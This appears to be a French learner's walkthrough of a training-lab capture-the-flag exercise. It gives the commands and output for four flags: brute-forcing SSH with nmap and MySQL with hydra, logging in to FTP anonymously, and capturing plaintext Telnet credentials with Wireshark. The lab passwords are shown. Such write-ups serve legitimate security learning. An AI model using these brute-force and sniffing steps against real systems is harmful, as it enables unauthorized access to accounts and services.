# Nmap CTF — Guide Complet — Mon Apprentissage

**Module** : Network Exploitation CTF  
**Durée** : 2h15  
**Objectif** : 4 flags à trouver

---

## Avant De Commencer

### Setup

```bash
# Démarrer le lab
jedha-cli start nmap-ctf

# La subnet à scanner
101.10.10.0/24
```

### Stratégie Générale

```
Flag 1 → SSH brute-force
Flag 2 → FTP anonymous login
Flag 3 → MySQL enum + hydra brute-force
Flag 4 → Telnet + Wireshark (MITM)
```

---

# FLAG 1 : SSH Brute Force

## Étapes

### Étape 1 : Énumération Réseau

```bash
nmap 101.10.10.0/24
```

**Résultat attendu** :
```
101.10.10.4 : 22/tcp open ssh
```

### Étape 2 : Créer La Liste D'utilisateurs

```bash
nano user.lst
```

**Contenu** :
```
developer
```

Sauvegarder (CTRL+X, Y, ENTER).

### Étape 3 : SSH Brute Force Avec Nmap

```bash
nmap 101.10.10.4 -p 22 --script ssh-brute \
  --script-args userdb=/chemin/complet/user.lst,passdb=/usr/share/wordlists/fasttrack.txt
```

⚠️ **IMPORTANT** : remplacer `/chemin/complet/` par le chemin ABSOLU de user.lst!

```bash
# Pour obtenir le chemin absolu
pwd
# Résultat : /home/pierre (par exemple)

# Donc la commande devient
nmap 101.10.10.4 -p 22 --script ssh-brute \
  --script-args userdb=/home/pierre/user.lst,passdb=/usr/share/wordlists/fasttrack.txt
```

### Étape 4 : Récupérer La Flag

**Résultat** : ssh-brute va trouver le password.

Exemple :
```
[22][ssh] host: 101.10.10.4 login: developer password: sunshine123
```

### Étape 5 : Se Connecter Et Récupérer La Flag

```bash
ssh developer@101.10.10.4
# Password: sunshine123

cat /home/developer/flag1.txt
# FLAG{...}
```

---

# FLAG 2 : FTP Anonymous

## Étapes

### Étape 1 : Scanner FTP

```bash
nmap -sV -sC 101.10.10.5
```

**Résultat** :
```
21/tcp open ftp
| ftp-anon: Anonymous FTP login allowed
|_-rw-r--r-- 1 0 0 flag2.txt
```

### Étape 2 : Se Connecter À FTP

```bash
ftp 101.10.10.5
```

Réponse : `Connected to 101.10.10.5`

### Étape 3 : Login Anonyme

```
Name (101.10.10.5:pierre): anonymous
```

Appuyer sur ENTER.

```
Password:
```

Appuyer sur ENTER (pas de password).

Résultat : `230 Login successful`

### Étape 4 : Lister Les Fichiers

```
ftp> ls
```

Résultat :
```
-rw-r--r-- 1 0 0 flag2.txt
```

### Étape 5 : Télécharger La Flag

```
ftp> get flag2.txt
```

### Étape 6 : Quitter Et Lire

```
ftp> quit
```

```bash
cat flag2.txt
# FLAG{...}
```

---

# FLAG 3 : MySQL Brute Force

## Étapes

### Étape 1 : Scanner MySQL

```bash
nmap 101.10.10.6
```

**Résultat** :
```
3306/tcp open mysql
```

### Étape 2 : Énumérer MySQL

```bash
nmap --script=mysql-enum 101.10.10.6
```

**Résultat** :
```
| mysql-enum:
|   Valid usernames:
|     root
```

### Étape 3 : Créer Liste D'utilisateurs

```bash
echo "root" > user.txt
```

### Étape 4 : Brute Force Avec Hydra

```bash
hydra -L user.txt -P /usr/share/wordlists/sqlmap.txt \
  -e ns -V mysql://101.10.10.6
```

**Explication des options** :
* `-L user.txt` = liste des utilisateurs
* `-P /usr/share/wordlists/sqlmap.txt` = liste des passwords
* `-e ns` = null (pas de password) + reverse (user comme password)
* `-V` = verbose (voir les tentatives)
* `mysql://` = protocole MySQL

**Attendre quelques minutes...**

### Étape 5 : Résultat

```
[3306][mysql] host: 101.10.10.6 login: root password: .9UbDwd!
```

### Étape 6 : Se Connecter À MySQL

```bash
mysql -h 101.10.10.6 -u root -p
```

Password : `.9UbDwd!`

### Étape 7 : Trouver La Flag

```sql
SHOW DATABASES;
```

Résultat :
```
| flagdb |
```

```sql
USE flagdb;
```

```sql
SELECT * FROM flagtable;
```

**Résultat** : FLAG{...}

---

# FLAG 4 : Telnet + Wireshark (MITM)

## Concept Clé

C'est la flag la plus tricksy. Au lieu de brute-force, tu vas :

1. Écouter le trafic réseau (Wireshark)
2. Un cron job teste une connexion Telnet
3. Tu vas voir le username + password en clair
4. Tu te connectes avec ces credentials

## Étapes

### Étape 1 : Découvrir Telnet

```bash
nmap 101.10.10.2
```

**Résultat** :
```
23/tcp open telnet
```

### Étape 2 : Lancer Wireshark

```bash
sudo wireshark
```

**Interface** : choisir l'interface réseau active (eth0 ou autre)

**Start** : cliquer sur le triangle vert pour démarrer l'écoute

### Étape 3 : Attendre Et Observer

**Laisser Wireshark tourner pendant 1-2 minutes.**

Un cron job va tenter une connexion Telnet à 101.10.10.3 et tu vas voir :

```
Telnet Protocol Data:
IAC WILL ECHO
[username typed]: telnet
[password typed]: password123
```

### Étape 4 : Se Connecter À 101.10.10.2

Arrêter Wireshark, puis :

```bash
telnet 101.10.10.2 23
```

```
Connected to 101.10.10.2
login: telnet
Password: password123
```

### Étape 5 : Récupérer La Flag

```bash
cat /home/telnet/flag4.txt
# FLAG{...}
```

---

# RÉSUMÉ DES 4 FLAGS

| Flag | IP | Service | Méthode | Port |
|------|----|---------|---------| ----|
| 1 | 101.10.10.4 | SSH | Nmap ssh-brute | 22 |
| 2 | 101.10.10.5 | FTP | FTP anonymous | 21 |
| 3 | 101.10.10.6 | MySQL | Hydra brute-force | 3306 |
| 4 | 101.10.10.2 | Telnet | Wireshark MITM | 23 |

---

# Commandes Clés À Retenir

```bash
# Énumération réseau
nmap 101.10.10.0/24

# SSH brute-force avec Nmap
nmap -p 22 --script ssh-brute \
  --script-args userdb=PATH/user.lst,passdb=/usr/share/wordlists/fasttrack.txt 101.10.10.4

# FTP enumeration
nmap -sV -sC 101.10.10.5

# FTP connection
ftp 101.10.10.5

# MySQL enumeration
nmap --script=mysql-enum 101.10.10.6

# Hydra brute-force
hydra -L user.txt -P /usr/share/wordlists/sqlmap.txt -e ns -V mysql://101.10.10.6

# MySQL connection
mysql -h 101.10.10.6 -u root -p

# Wireshark
sudo wireshark

# Telnet connection
telnet 101.10.10.2 23
```

---

# Points Importants

1. **Flag 1** : ssh-brute script nmap + wordlist
2. **Flag 2** : FTP anonyme (pas de security!)
3. **Flag 3** : Hydra + énumération préalable
4. **Flag 4** : MITM attack via Wireshark (Telnet plaintext)

---

# Common Issues Et Solutions

**Erreur: "user.lst: No such file or directory"**
→ Utiliser le chemin ABSOLU, pas relatif!

**Hydra lent**
→ C'est normal, attendre 5-10 minutes

**Wireshark vide**
→ S'assurer que le bon interface est sélectionné
→ Laisser tourner plus longtemps (2+ minutes)

**SSH/FTP/MySQL connection refused**
→ Vérifier que Nmap a bien détecté le port open
→ Relancer le lab si nécessaire
